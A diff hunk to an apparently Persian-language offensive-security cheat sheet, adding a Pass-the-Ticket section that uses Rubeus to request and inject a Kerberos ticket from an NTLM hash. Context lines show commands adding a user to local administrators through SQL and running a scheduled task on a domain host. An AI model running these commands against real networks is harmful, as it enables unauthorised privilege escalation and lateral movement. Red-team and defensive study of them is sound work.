@@ -551,6 +551,13 @@ Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” 
 7.schtasks /run /s DOMAIN /TN "enterprise”
 ```
 
+### ارتقا دسترسی با استفاده از روش Pass-the-Ticket
+
+```text
+1..\Rubeus.exe asktgt /user:<USET>$ /rc4:<NTLM HASH> /ptt
+2.klist
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
